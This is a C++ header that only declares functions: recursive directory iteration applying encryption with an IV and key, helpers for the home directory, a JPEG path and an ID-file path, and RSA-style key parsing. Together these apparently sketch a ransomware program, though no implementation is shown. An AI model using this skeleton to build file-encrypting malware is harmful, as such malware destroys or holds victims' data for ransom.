#pragma once
#include "common.h"
#include <boost/filesystem/operations.hpp>

using namespace boost::filesystem;
using std::string;

typedef void(*Processing_func) (string, PBYTE, PBYTE);

bool do_encrypt(const string& path);
bool do_decrypt(const string& path);
void iterate(const path& parent, Processing_func process, PBYTE iv, PBYTE key);
void iterate2(const path& parent, Processing_func process, PBYTE iv, PBYTE key, std::vector<string> processedPaths);

//void process(const path& path);
size_t getFileSize(const string path);
string get_home();
string string_to_hex(const string& input);
string get_path_to_jpeg();
string get_path_to_id();
void parsePublicKey(const string& str, string& mod, string& exp);
struct StringPrivateBlob parsePrivateKey(const string&  str);